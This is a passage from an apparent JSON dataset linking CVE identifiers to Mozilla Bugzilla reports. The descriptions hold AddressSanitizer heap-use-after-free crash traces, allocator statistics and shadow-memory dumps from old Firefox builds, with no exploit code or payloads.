nsJSContext::EvaluateString(nsAString_internal const&, JSObject*, nsIPrincipal*, nsIPrincipal*, char const*, unsigned int, JSVersion, nsAString_internal*, bool*) firefox/src/dom/base/nsJSEnvironment.cpp:1466 #21 0x7f51392f3c9e in nsGlobalWindow::RunTimeoutHandler(nsTimeout*, nsIScriptContext*) firefox/src/dom/base/nsGlobalWindow.cpp:9527 #22 0x7f51392a9d32 in nsGlobalWindow::RunTimeout(nsTimeout*) firefox/src/dom/base/nsGlobalWindow.cpp:9791 #23 0x7f51392f1eab in nsGlobalWindow::TimerCallback(nsITimer*, void*) firefox/src/dom/base/nsGlobalWindow.cpp:10063 #24 0x7f5140707272 in nsTimerImpl::Fire() firefox/src/xpcom/threads/nsTimerImpl.cpp:474 #25 0x7f5140708eac in nsTimerEvent::Run() firefox/src/xpcom/threads/nsTimerImpl.cpp:558 #26 0x7f51406cb4fd in nsThread::ProcessNextEvent(bool, bool*) firefox/src/xpcom/threads/nsThread.cpp:625 #27 0x7f514035a30d in NS_ProcessNextEvent_P(nsIThread*, bool) firefox/src/objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:217 #28 0x7f513f3fb366 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) firefox/src/ipc/glue/MessagePump.cpp:82 #29 0x7f514097f46a in MessageLoop::RunInternal() firefox/src/ipc/chromium/src/base/message_loop.cc:209 #30 0x7f514097f2b3 in MessageLoop::RunHandler() firefox/src/ipc/chromium/src/base/message_loop.cc:202 #31 0x7f514097f198 in MessageLoop::Run() firefox/src/ipc/chromium/src/base/message_loop.cc:176 #32 0x7f513e9321ee in nsBaseAppShell::Run() firefox/src/widget/xpwidgets/nsBaseAppShell.cpp:165 #33 0x7f513d585a28 in nsAppStartup::Run() firefox/src/toolkit/components/startup/nsAppStartup.cpp:257 #34 0x7f5133d63830 in XREMain::XRE_mainRun() firefox/src/toolkit/xre/nsAppRunner.cpp:3787 #35 0x7f5133d6a1d2 in XREMain::XRE_main(int, char**, nsXREAppData const*) firefox/src/toolkit/xre/nsAppRunner.cpp:3864 #36 0x7f5133d6d6a2 in XRE_main firefox/src/toolkit/xre/nsAppRunner.cpp:3940 #37 0x40c29f in do_main(int, char**) firefox/src/browser/app/nsBrowserApp.cpp:160 #38 0x409ccd in main firefox/src/browser/app/nsBrowserApp.cpp:298 #39 0x7f51504e8c4d in ?? ??:0 0x7f51151628d0 is located 80 bytes inside of 1112-byte region [0x7f5115162880,0x7f5115162cd8) freed by thread T0 here: #0 0x4a43a2 in free ??:0 #1 0x7f514d3745d3 in moz_free firefox/src/memory/mozalloc/mozalloc.cpp:49 #2 0x7f513470e4f6 in ~nsHttpChannel firefox/src/netwerk/protocol/http/nsHttpChannel.cpp:332 #3 0x7f5140440702 in nsHashPropertyBag::Release() firefox/src/xpcom/ds/nsHashPropertyBag.cpp:40 #4 0x7f51346da3d4 in mozilla::net::HttpBaseChannel::Release() firefox/src/netwerk/protocol/http/HttpBaseChannel.cpp:143 #5 0x7f51347788b4 in mozilla::net::nsHttpChannel::Release() firefox/src/netwerk/protocol/http/nsHttpChannel.cpp:4242 #6 0x7f51347789ec in non-virtual thunk to mozilla::net::nsHttpChannel::Release() firefox/src/modules/zlib/src/inffast.c:0 #7 0x7f5133e87001 in nsCOMPtr_base::assign_assuming_AddRef(nsISupports*) firefox/src/../../dist/include/nsCOMPtr.h:440 #8 0x7f5140310e44 in nsCOMPtr_base::assign_with_AddRef(nsISupports*) firefox/src/objdir-ff-asan-sym/xpcom/build/nsCOMPtr.cpp:50 #9 0x7f5133e7d563 in nsCOMPtr<nsIChannel>::operator=(nsIChannel*) firefox/src/../../../../dist/include/nsCOMPtr.h:624 #10 0x7f513470a0f6 in mozilla::net::AutoRedirectVetoNotifier::ReportRedirectResult(bool) firefox/src/netwerk/protocol/http/nsHttpChannel.cpp:178 #11 0x7f51347c5068 in ~AutoRedirectVetoNotifier firefox/src/netwerk/protocol/http/nsHttpChannel.cpp:162 #12 0x7f513474a9c3 in ~AutoRedirectVetoNotifier firefox/src/netwerk/protocol/http/nsHttpChannel.cpp:162 #13 0x7f51347774ff in mozilla::net::nsHttpChannel::ContinueProcessRedirection(unsigned int) firefox/src/netwerk/protocol/http/nsHttpChannel.cpp:4195 #14 0x7f51347a8e76 in mozilla::net::nsHttpChannel::OnRedirectVerifyCallback(unsigned int) firefox/src/netwerk/protocol/http/nsHttpChannel.cpp:5782 #15 0x7f51347a9ad2 in non-virtual thunk to mozilla::net::nsHttpChannel::OnRedirectVerifyCallback(unsigned int) firefox/src/modules/zlib/src/inffast.c:0 #16 0x7f5133e87ca4 in nsAsyncVerifyRedirectCallbackEvent::Run() firefox/src/netwerk/base/src/nsAsyncRedirectVerifyHelper.cpp:44 #17 0x7f51406cb4fd in nsThread::ProcessNextEvent(bool, bool*) firefox/src/xpcom/threads/nsThread.cpp:625 #18 0x7f514035a30d in NS_ProcessNextEvent_P(nsIThread*, bool) firefox/src/objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:217 #19 0x7f513f3fb366 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) firefox/src/ipc/glue/MessagePump.cpp:82 #20 0x7f514097f46a in MessageLoop::RunInternal() firefox/src/ipc/chromium/src/base/message_loop.cc:209 #21 0x7f514097f2b3 in MessageLoop::RunHandler() firefox/src/ipc/chromium/src/base/message_loop.cc:202 #22 0x7f514097f198 in MessageLoop::Run() firefox/src/ipc/chromium/src/base/message_loop.cc:176 #23 0x7f513e9321ee in nsBaseAppShell::Run() firefox/src/widget/xpwidgets/nsBaseAppShell.cpp:165 #24 0x7f513d585a28 in nsAppStartup::Run() firefox/src/toolkit/components/startup/nsAppStartup.cpp:257 #25 0x7f5133d63830 in XREMain::XRE_mainRun() firefox/src/toolkit/xre/nsAppRunner.cpp:3787 #26 0x7f5133d6a1d2 in XREMain::XRE_main(int, char**, nsXREAppData const*) firefox/src/toolkit/xre/nsAppRunner.cpp:3864 #27 0x7f5133d6d6a2 in XRE_main firefox/src/toolkit/xre/nsAppRunner.cpp:3940 #28 0x40c29f in do_main(int, char**) firefox/src/browser/app/nsBrowserApp.cpp:160 #29 0x409ccd in main firefox/src/browser/app/nsBrowserApp.cpp:298 previously allocated by thread T0 here: #0 0x4a4462 in __interceptor_malloc ??:0 #1 0x7f514d374727 in moz_xmalloc firefox/src/memory/mozalloc/mozalloc.cpp:54 #2 0x7f51346c8bd9 in nsHttpHandler::NewProxiedChannel(nsIURI*, nsIProxyInfo*, nsIChannel**) firefox/src/netwerk/protocol/http/nsHttpHandler.cpp:1437 #3 0x7f51346c7acb in nsHttpHandler::NewChannel(nsIURI*, nsIChannel**) firefox/src/netwerk/protocol/http/nsHttpHandler.cpp:1398 #4 0x7f5133f6c1eb in nsIOService::NewChannelFromURIWithProxyFlags(nsIURI*, nsIURI*, unsigned int, nsIChannel**) firefox/src/netwerk/base/src/nsIOService.cpp:657 #5 0x7f5133f6ada0 in nsIOService::NewChannelFromURI(nsIURI*, nsIChannel**) firefox/src/netwerk/base/src/nsIOService.cpp:576 #6 0x7f51347757e2 in mozilla::net::nsHttpChannel::ContinueProcessRedirectionAfterFallback(unsigned int) firefox/src/netwerk/protocol/http/nsHttpChannel.cpp:4120 #7 0x7f5134723559 in mozilla::net::nsHttpChannel::AsyncProcessRedirection(unsigned int) firefox/src/netwerk/protocol/http/nsHttpChannel.cpp:4052 #8 0x7f5134734a7c in mozilla::net::nsHttpChannel::ProcessResponse() firefox/src/netwerk/protocol/http/nsHttpChannel.cpp:1264 #9 0x7f513478d8bc in mozilla::net::nsHttpChannel::OnStartRequest(nsIRequest*, nsISupports*) firefox/src/netwerk/protocol/http/nsHttpChannel.cpp:4802 #10 0x7f513478ee97 in non-virtual thunk to mozilla::net::nsHttpChannel::OnStartRequest(nsIRequest*, nsISupports*) firefox/src/modules/zlib/src/inffast.c:0 #11 0x7f5133f3f162 in nsInputStreamPump::OnStateStart() firefox/src/netwerk/base/src/nsInputStreamPump.cpp:416 #12 0x7f5133f3e30d in nsInputStreamPump::OnInputStreamReady(nsIAsyncInputStream*) firefox/src/netwerk/base/src/nsInputStreamPump.cpp:367 #13 0x7f5133f41c2f in non-virtual thunk to nsInputStreamPump::OnInputStreamReady(nsIAsyncInputStream*) firefox/src/modules/zlib/src/inffast.c:0 #14 0x7f51405b72ee in nsInputStreamReadyEvent::Run() firefox/src/xpcom/io/nsStreamUtils.cpp:82 #15 0x7f51406cb4fd in nsThread::ProcessNextEvent(bool, bool*) firefox/src/xpcom/threads/nsThread.cpp:625 #16 0x7f514035a30d in NS_ProcessNextEvent_P(nsIThread*, bool) firefox/src/objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:217 #17 0x7f513f3fb366 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) firefox/src/ipc/glue/MessagePump.cpp:82 #18 0x7f514097f46a in MessageLoop::RunInternal() firefox/src/ipc/chromium/src/base/message_loop.cc:209 #19 0x7f514097f2b3 in MessageLoop::RunHandler() firefox/src/ipc/chromium/src/base/message_loop.cc:202 #20 0x7f514097f198 in MessageLoop::Run() firefox/src/ipc/chromium/src/base/message_loop.cc:176 #21 0x7f513e9321ee in nsBaseAppShell::Run() firefox/src/widget/xpwidgets/nsBaseAppShell.cpp:165 #22 0x7f513d585a28 in nsAppStartup::Run() firefox/src/toolkit/components/startup/nsAppStartup.cpp:257 #23 0x7f5133d63830 in XREMain::XRE_mainRun() firefox/src/toolkit/xre/nsAppRunner.cpp:3787 #24 0x7f5133d6a1d2 in XREMain::XRE_main(int, char**, nsXREAppData const*) firefox/src/toolkit/xre/nsAppRunner.cpp:3864 ==16419== ABORTING Stats: 340M malloced (374M for red zones) by 855014 calls Stats: 92M realloced by 60631 calls Stats: 302M freed by 692995 calls Stats: 180M really freed by 372279 calls Stats: 480M (122951 full pages) mmaped in 120 calls mmaps by size class: 8:425958; 9:57337; 10:24570; 11:20470; 12:6144; 13:4608; 14:1792; 15:384; 16:640; 17:160; 18:336; 19:48; 20:16; mallocs by size class: 8:671876; 9:92732; 10:38267; 11:31549; 12:8574; 13:6870; 14:2771; 15:720; 16:804; 17:284; 18:490; 19:62; 20:15; frees by size class: 8:533367; 9:79542; 10:33885; 11:27984; 12:7349; 13:6211; 14:2532; 15:641; 16:706; 17:264; 18:443; 19:59; 20:12; rfrees by size class: 8:274158; 9:50191; 10:20177; 11:18120; 12:3448; 13:3069; 14:1711; 15:414; 16:562; 17:161; 18:216; 19:42; 20:10; Stats: malloc large: 851 small slow: 4152 Shadow byte and word: 0x1fea22a2c51a: fd 0x1fea22a2c518: fd fd fd fd fd fd fd fd More shadow bytes: 0x1fea22a2c4f8: fa fa fa fa fa fa fa fa 0x1fea22a2c500: fa fa fa fa fa fa fa fa 0x1fea22a2c508: fa fa fa fa fa fa fa fa 0x1fea22a2c510: fd fd fd fd fd fd fd fd =>0x1fea22a2c518: fd fd fd fd fd fd fd fd 0x1fea22a2c520: fd fd fd fd fd fd fd fd 0x1fea22a2c528: fd fd fd fd fd fd fd fd 0x1fea22a2c530: fd fd fd fd fd fd fd fd 0x1fea22a2c538: fd fd fd fd fd fd fd fd"
      }
    ],
    "CVE-2012-1974": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=769303",
        "title": "Heap-use-after-free in gfxTextRun::CanBreakLineBefore",
        "description": "Reproduces on 20120627175514 http://hg.mozilla.org/mozilla-central/rev/d254c07f3301 Crash and free stacks look different from https://bugzilla.mozilla.org/show_bug.cgi?id=767765 ================================================================= ==22134== ERROR: AddressSanitizer heap-use-after-free on address 0x7f3bb2655488 at pc 0x7f3bd8f94d3d bp 0x7fffa294c730 sp 0x7fffa294c728 READ of size 8 at 0x7f3bb2655488 thread T0 #0 0x7f3bd8f94d3d in gfxTextRun::CanBreakLineBefore(unsigned int) firefox/src/modules/zlib/src/inffast.c:0 #1 0x7f3bd8f90835 in nsTextFrame::AddInlineMinWidthForFlow(nsRenderingContext*, nsIFrame::InlineMinWidthData*, nsTextFrame::TextRunType) firefox/src/layout/generic/nsTextFrameThebes.cpp:6644 #2 0x7f3bd8f965c8 in nsTextFrame::AddInlineMinWidth(nsRenderingContext*, nsIFrame::InlineMinWidthData*) firefox/src/layout/generic/nsTextFrameThebes.cpp:6746 #3 0x7f3bd8a1f7b4 in nsBlockFrame::GetMinWidth(nsRenderingContext*) firefox/src/layout/generic/nsBlockFrame.cpp:754 #4 0x7f3bd8b99595 in nsFrame::ShrinkWidthToFit(nsRenderingContext*, int) firefox/src/layout/generic/nsFrame.cpp:3935 #5 0x7f3bd8b1270a in nsContainerFrame::ComputeAutoSize(nsRenderingContext*, nsSize, int, nsSize, nsSize, nsSize, bool) firefox/src/layout/generic/nsContainerFrame.cpp:860 #6 0x7f3bd8b94d8e in nsFrame::ComputeSize(nsRenderingContext*, nsSize, int, nsSize, nsSize, nsSize, unsigned int) firefox/src/layout/generic/nsFrame.cpp:3780 #7 0x7f3bd8ac780d in FloatMarginWidth(nsHTMLReflowState const&, int, nsIFrame*, nsCSSOffsetState const&) firefox/src/layout/generic/nsBlockReflowState.cpp:562 #8 0x7f3bd8ac0ff2 in nsBlockReflowState::FlowAndPlaceFloat(nsIFrame*) firefox/src/layout/generic/nsBlockReflowState.cpp:608 #9 0x7f3bd8abf61b in nsBlockReflowState::AddFloat(nsLineLayout*, nsIFrame*, int) firefox/src/layout/generic/nsBlockReflowState.cpp:503 #10 0x7f3bd8dbc403 in nsLineLayout::AddFloat(nsIFrame*, int) firefox/src/layout/generic/nsLineLayout.h:195 #11 0x7f3bd8db530b in nsLineLayout::ReflowFrame(nsIFrame*, unsigned int&, nsHTMLReflowMetrics*, bool&) firefox/src/layout/generic/nsLineLayout.cpp:868 #12 0x7f3bd8a6fe3f in nsBlockFrame::ReflowInlineFrame(nsBlockReflowState&, nsLineLayout&, nsLineList_iterator, nsIFrame*, LineReflowStatus*) firefox/src/layout/generic/nsBlockFrame.cpp:3834 #13 0x7f3bd8a6989a in nsBlockFrame::DoReflowInlineFrames(nsBlockReflowState&, nsLineLayout&, nsLineList_iterator, nsFlowAreaRect&, int&, nsFloatManager::SavedState*, bool*, LineReflowStatus*, bool) firefox/src/layout/generic/nsBlockFrame.cpp:3630 #14 0x7f3bd8a5c317 in nsBlockFrame::ReflowInlineFrames(nsBlockReflowState&, nsLineList_iterator, bool*) firefox/src/layout/generic/nsBlockFrame.cpp:3482 #15 0x7f3bd8a4accc in nsBlockFrame::ReflowLine(nsBlockReflowState&, nsLineList_iterator, bool*) firefox/src/layout/generic/nsBlockFrame.cpp:2570 #16 0x7f3bd8a30131 in nsBlockFrame::ReflowDirtyLines(nsBlockReflowState&) firefox/src/layout/generic/nsBlockFrame.cpp:2020 #17 0x7f3bd8a23bcf in nsBlockFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) firefox/src/layout/generic/nsBlockFrame.cpp:1069 #18 0x7f3bd8b136a7 in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, int, int, unsigned int, unsigned int&, nsOverflowContinuationTracker*) firefox/src/layout/generic/nsContainerFrame.cpp:906 #19 0x7f3bd8ce39a7 in nsCanvasFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) firefox/src/layout/generic/nsCanvasFrame.cpp:429 #20 0x7f3bd8b136a7 in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, int, int, unsigned int, unsigned int&, nsOverflowContinuationTracker*) firefox/src/layout/generic/nsContainerFrame.cpp:906 #21 0x7f3bd8c5d74e in nsHTMLScrollFrame::ReflowScrolledFrame(ScrollReflowState*, bool, bool, nsHTMLReflowMetrics*, bool) firefox/src/layout/generic/nsGfxScrollFrame.cpp:517 #22 0x7f3bd8c62ffa in nsHTMLScrollFrame::ReflowContents(ScrollReflowState*, nsHTMLReflowMetrics const&) firefox/src/layout/generic/nsGfxScrollFrame.cpp:617 #23 0x7f3bd8c6731f in nsHTMLScrollFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) firefox/src/layout/generic/nsGfxScrollFrame.cpp:858 #24 0x7f3bd8b136a7 in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, int, int, unsigned int, unsigned int&, nsOverflowContinuationTracker*) firefox/src/layout/generic/nsContainerFrame.cpp:906 #25 0x7f3bd903bea1 in ViewportFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) firefox/src/layout/generic/nsViewportFrame.cpp:200 #26 0x7f3bd8794ca6 in PresShell::DoReflow(nsIFrame*, bool) firefox/src/layout/base/nsPresShell.cpp:7383 #27 0x7f3bd87c26ad in PresShell::ProcessReflowCommands(bool) firefox/src/layout/base/nsPresShell.cpp:7524 #28 0x7f3bd87c0dbd in PresShell::FlushPendingNotifications(mozFlushType) firefox/src/layout/base/nsPresShell.cpp:3852 #29 0x7f3bda01773e in nsDocument::FlushPendingNotifications(mozFlushType) firefox/src/content/base/src/nsDocument.cpp:6296 #30 0x7f3bdc20db5a in nsGlobalWindow::FlushPendingNotifications(mozFlushType) firefox/src/dom/base/nsGlobalWindow.cpp:9763 #31 0x7f3bdc24133a in nsGlobalWindow::ScrollBy(int, int) firefox/src/dom/base/nsGlobalWindow.cpp:5452 #32 0x7f3be353289a in NS_InvokeByIndex_P firefox/src/xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:161 #33 0x7f3bdee9e9db in CallMethodHelper::Call() firefox/src/js/xpconnect/src/XPCWrappedNative.cpp:2405 #34 0x7f3bdef05db4 in XPC_WN_CallMethod(JSContext*, unsigned int, JS::Value*) firefox/src/js/xpconnect/src/XPCWrappedNativeJSOps.cpp:1474 #35 0x7f3be88569dd in js::CallJSNative(JSContext*, int (*)(JSContext*, unsigned int, JS::Value*), js::CallArgs const&) firefox/src/js/src/jscntxtinlines.h:400 #36 0x7f3be87cabbd in js::Interpret(JSContext*, js::StackFrame*, js::InterpMode) firefox/src/js/src/jsinterp.cpp:2437 #37 0x7f3be8750397 in js::RunScript(JSContext*, JSScript*, js::StackFrame*) firefox/src/js/src/jsinterp.cpp:267 #38 0x7f3be88637ed in js::ExecuteKernel(JSContext*, JSScript*, JSObject&, JS::Value const&, js::ExecuteType, js::StackFrame*, JS::Value*) firefox/src/js/src/jsinterp.cpp:455 #39 0x7f3be88654f0 in js::Execute(JSContext*, JSScript*, JSObject&, JS::Value*) firefox/src/js/src/jsinterp.cpp:492 #40 0x7f3be8094c46 in EvaluateUCScriptForPrincipalsCommon(JSContext*, JSObject*, JSPrincipals*, JSPrincipals*, unsigned short const*, unsigned int, char const*, unsigned int, JS::Value*, JSVersion) firefox/src/js/src/jsapi.cpp:5371 #41 0x7f3be8096b6c in JS_EvaluateUCScriptForPrincipalsVersionOrigin firefox/src/js/src/jsapi.cpp:5408 #42 0x7f3bdc0fbd1a in nsJSContext::EvaluateString(nsAString_internal const&, JSObject*, nsIPrincipal*, nsIPrincipal*, char const*, unsigned int, JSVersion, nsAString_internal*, bool*) firefox/src/dom/base/nsJSEnvironment.cpp:1463 #43 0x7f3bdc29e18e in nsGlobalWindow::RunTimeoutHandler(nsTimeout*, nsIScriptContext*) firefox/src/dom/base/nsGlobalWindow.cpp:9057 #44 0x7f3bdc25e272 in nsGlobalWindow::RunTimeout(nsTimeout*) firefox/src/dom/base/nsGlobalWindow.cpp:9321 #45 0x7f3bdc29c39b in nsGlobalWindow::TimerCallback(nsITimer*, void*) firefox/src/dom/base/nsGlobalWindow.cpp:9593 #46 0x7f3be346f0e2 in nsTimerImpl::Fire() firefox/src/xpcom/threads/nsTimerImpl.cpp:474 #47 0x7f3be3470d1c in nsTimerEvent::Run() firefox/src/xpcom/threads/nsTimerImpl.cpp:558 #48 0x7f3be34333d3 in nsThread::ProcessNextEvent(bool, bool*) firefox/src/xpcom/threads/nsThread.cpp:625 #49 0x7f3be30c242d in NS_ProcessNextEvent_P(nsIThread*, bool) firefox/src/objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:217 #50 0x7f3be221fec6 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) firefox/src/ipc/glue/MessagePump.cpp:82 #51 0x7f3be36e5bca in MessageLoop::RunInternal() firefox/src/ipc/chromium/src/base/message_loop.cc:209 #52 0x7f3be36e5a13 in MessageLoop::RunHandler() firefox/src/ipc/chromium/src/base/message_loop.cc:202 #53 0x7f3be36e58f8 in MessageLoop::Run() firefox/src/ipc/chromium/src/base/message_loop.cc:176 #54 0x7f3be175d9ae in nsBaseAppShell::Run() firefox/src/widget/xpwidgets/nsBaseAppShell.cpp:165 #55 0x7f3be03a7dc8 in nsAppStartup::Run() firefox/src/toolkit/components/startup/nsAppStartup.cpp:256 #56 0x7f3bd6d8d6a7 in XREMain::XRE_mainRun() firefox/src/toolkit/xre/nsAppRunner.cpp:3786 #57 0x7f3bd6d94062 in XREMain::XRE_main(int, char**, nsXREAppData const*) firefox/src/toolkit/xre/nsAppRunner.cpp:3863 #58 0x7f3bd6d9751b in XRE_main firefox/src/toolkit/xre/nsAppRunner.cpp:3939 #59 0x40a91f in do_main(int, char**) firefox/src/browser/app/nsBrowserApp.cpp:160 #60 0x40834d in main firefox/src/browser/app/nsBrowserApp.cpp:330 #61 0x7f3bf15eac4d in ?? ??:0 0x7f3bb2655488 is located 8 bytes inside of 580-byte region [0x7f3bb2655480,0x7f3bb26556c4) freed by thread T0 here: #0 0x4a2ed2 in free ??:0 #1 0x7f3bee4785c3 in moz_free firefox/src/memory/mozalloc/mozalloc.cpp:49 #2 0x7f3bd902be63 in gfxTextRun::operator delete(void*) firefox/src/gfx/thebes/gfxFont.h:2335 #3 0x7f3be3a5bdd8 in ~gfxTextRun firefox/src/gfx/thebes/gfxFont.cpp:4344 #4 0x7f3bd8f1c1de in nsTextFrame::ClearTextRun(nsTextFrame*, nsTextFrame::TextRunType) firefox/src/layout/generic/nsTextFrameThebes.cpp:4263 #5 0x7f3bd8f18068 in BuildTextRunsScanner::AssignTextRun(gfxTextRun*, float) firefox/src/layout/generic/nsTextFrameThebes.cpp:2359 #6 0x7f3bd8f07dd8 in BuildTextRunsScanner::BuildTextRunForFrames(void*) firefox/src/layout/generic/nsTextFrameThebes.cpp:2021 #7 0x7f3bd8efe01d in BuildTextRunsScanner::FlushFrames(bool, bool) firefox/src/layout/generic/nsTextFrameThebes.cpp:1372 #8 0x7f3bd8f21528 in BuildTextRuns(gfxContext*, nsTextFrame*, nsIFrame*, nsLineList_iterator const*, nsTextFrame::TextRunType) firefox/src/layout/generic/nsTextFrameThebes.cpp:1301 #9 0x7f3bd8f1d1a4 in nsTextFrame::EnsureTextRun(nsTextFrame::TextRunType, gfxContext*, nsIFrame*, nsLineList_iterator const*, unsigned int*) firefox/src/layout/generic/nsTextFrameThebes.cpp:2391 #10 0x7f3bd8f8f6c8 in nsTextFrame::AddInlineMinWidthForFlow(nsRenderingContext*, nsIFrame::InlineMinWidthData*, nsTextFrame::TextRunType) firefox/src/layout/generic/nsTextFrameThebes.cpp:6594 #11 0x7f3bd8f965c8 in nsTextFrame::AddInlineMinWidth(nsRenderingContext*, nsIFrame::InlineMinWidthData*) firefox/src/layout/generic/nsTextFrameThebes.cpp:6746 #12 0x7f3bd8b10bf5 in nsContainerFrame::DoInlineIntrinsicWidth(nsRenderingContext*, nsIFrame::InlineIntrinsicWidthData*, nsLayoutUtils::IntrinsicWidthType) firefox/src/layout/generic/nsContainerFrame.cpp:813 #13 0x7f3bd8b23b06 in nsFirstLetterFrame::AddInlineMinWidth(nsRenderingContext*, nsIFrame::InlineMinWidthData*) firefox/src/layout/generic/nsFirstLetterFrame.cpp:122 #14 0x7f3bd86b8a1b in nsLayoutUtils::MinWidthFromInline(nsIFrame*, nsRenderingContext*) firefox/src/layout/base/nsLayoutUtils.cpp:3009 #15 0x7f3bd8b23f38 in nsFirstLetterFrame::GetMinWidth(nsRenderingContext*) firefox/src/layout/generic/nsFirstLetterFrame.cpp:137 #16 0x7f3bd86a5453 in nsLayoutUtils::IntrinsicForContainer(nsRenderingContext*, nsIFrame*, nsLayoutUtils::IntrinsicWidthType) firefox/src/layout/base/nsLayoutUtils.cpp:2441 #17 0x7f3bd8b8f953 in nsIFrame::InlineMinWidthData::ForceBreak(nsRenderingContext*) firefox/src/layout/generic/nsFrame.cpp:3597 #18 0x7f3bd8b8ec67 in nsIFrame::InlineMinWidthData::OptionallyBreak(nsRenderingContext*, int) firefox/src/layout/generic/nsFrame.cpp:3622 #19 0x7f3bd8f919bc in nsTextFrame::AddInlineMinWidthForFlow(nsRenderingContext*, nsIFrame::InlineMinWidthData*, nsTextFrame::TextRunType) firefox/src/layout/generic/nsTextFrameThebes.cpp:6698 #20 0x7f3bd8f965c8 in nsTextFrame::AddInlineMinWidth(nsRenderingContext*, nsIFrame::InlineMinWidthData*) firefox/src/layout/generic/nsTextFrameThebes.cpp:6746 #21 0x7f3bd8a1f7b4 in nsBlockFrame::GetMinWidth(nsRenderingContext*) firefox/src/layout/generic/nsBlockFrame.cpp:754 #22 0x7f3bd8b99595 in nsFrame::ShrinkWidthToFit(nsRenderingContext*, int) firefox/src/layout/generic/nsFrame.cpp:3935 #23 0x7f3bd8b1270a in nsContainerFrame::ComputeAutoSize(nsRenderingContext*, nsSize, int, nsSize, nsSize, nsSize, bool) firefox/src/layout/generic/nsContainerFrame.cpp:860 #24 0x7f3bd8b94d8e in nsFrame::ComputeSize(nsRenderingContext*, nsSize, int, nsSize, nsSize, nsSize, unsigned int) firefox/src/layout/generic/nsFrame.cpp:3780 #25 0x7f3bd8ac780d in FloatMarginWidth(nsHTMLReflowState const&, int, nsIFrame*, nsCSSOffsetState const&) firefox/src/layout/generic/nsBlockReflowState.cpp:562 #26 0x7f3bd8ac0ff2 in nsBlockReflowState::FlowAndPlaceFloat(nsIFrame*) firefox/src/layout/generic/nsBlockReflowState.cpp:608 #27 0x7f3bd8abf61b in nsBlockReflowState::AddFloat(nsLineLayout*, nsIFrame*, int) firefox/src/layout/generic/nsBlockReflowState.cpp:503 #28 0x7f3bd8dbc403 in nsLineLayout::AddFloat(nsIFrame*, int) firefox/src/layout/generic/nsLineLayout.h:195 #29 0x7f3bd8db530b in nsLineLayout::ReflowFrame(nsIFrame*, unsigned int&, nsHTMLReflowMetrics*, bool&) firefox/src/layout/generic/nsLineLayout.cpp:868 previously allocated by thread T0 here: #0 0x4a2f92 in malloc ??:0 #1 0x7f3bee478a23 in moz_malloc firefox/src/memory/mozalloc/mozalloc.cpp:64 #2 0x7f3be3a5a6f6 in gfxTextRun::AllocateStorageForTextRun(unsigned long, unsigned int) firefox/src/gfx/thebes/gfxFont.cpp:4283 #3 0x7f3be3a3da3f in gfxTextRun::Create(gfxTextRunFactory::Parameters const*, unsigned int, gfxFontGroup*, unsigned int) firefox/src/gfx/thebes/gfxFont.cpp:4300 #4 0x7f3be3a41205 in gfxFontGroup::MakeTextRun(unsigned char const*, unsigned int, gfxTextRunFactory::Parameters const*, unsigned int) firefox/src/gfx/thebes/gfxFont.cpp:3367 #5 0x7f3bd8f14551 in gfxTextRun* MakeTextRun<unsigned char>(unsigned char const*, unsigned int, gfxFontGroup*, gfxTextRunFactory::Parameters const*, unsigned int) firefox/src/layout/generic/nsTextFrameThebes.cpp:533 #6 0x7f3bd8f077c5 in BuildTextRunsScanner::BuildTextRunForFrames(void*) firefox/src/layout/generic/nsTextFrameThebes.cpp:1981 #7 0x7f3bd8efe01d in BuildTextRunsScanner::FlushFrames(bool, bool) firefox/src/layout/generic/nsTextFrameThebes.cpp:1372 #8 0x7f3bd8f21528 in BuildTextRuns(gfxContext*, nsTextFrame*, nsIFrame*, nsLineList_iterator const*, nsTextFrame::TextRunType) firefox/src/layout/generic/nsTextFrameThebes.cpp:1301 #9 0x7f3bd8f1d1a4 in nsTextFrame::EnsureTextRun(nsTextFrame::TextRunType, gfxContext*, nsIFrame*, nsLineList_iterator const*, unsigned int*) firefox/src/layout/generic/nsTextFrameThebes.cpp:2391 #10 0x7f3bd8f8f6c8 in nsTextFrame::AddInlineMinWidthForFlow(nsRenderingContext*, nsIFrame::InlineMinWidthData*, nsTextFrame::TextRunType) firefox/src/layout/generic/nsTextFrameThebes.cpp:6594 #11 0x7f3bd8f965c8 in nsTextFrame::AddInlineMinWidth(nsRenderingContext*, nsIFrame::InlineMinWidthData*) firefox/src/layout/generic/nsTextFrameThebes.cpp:6746 #12 0x7f3bd8a1f7b4 in nsBlockFrame::GetMinWidth(nsRenderingContext*) firefox/src/layout/generic/nsBlockFrame.cpp:754 #13 0x7f3bd8b99595 in nsFrame::ShrinkWidthToFit(nsRenderingContext*, int) firefox/src/layout/generic/nsFrame.cpp:3935 #14 0x7f3bd8b1270a in nsContainerFrame::ComputeAutoSize(nsRenderingContext*, nsSize, int, nsSize, nsSize, nsSize, bool) firefox/src/layout/generic/nsContainerFrame.cpp:860 #15 0x7f3bd8b94d8e in nsFrame::ComputeSize(nsRenderingContext*, nsSize, int, nsSize, nsSize, nsSize, unsigned int) firefox/src/layout/generic/nsFrame.cpp:3780 #16 0x7f3bd8ac780d in FloatMarginWidth(nsHTMLReflowState const&, int, nsIFrame*, nsCSSOffsetState const&) firefox/src/layout/generic/nsBlockReflowState.cpp:562 #17 0x7f3bd8ac0ff2 in nsBlockReflowState::FlowAndPlaceFloat(nsIFrame*) 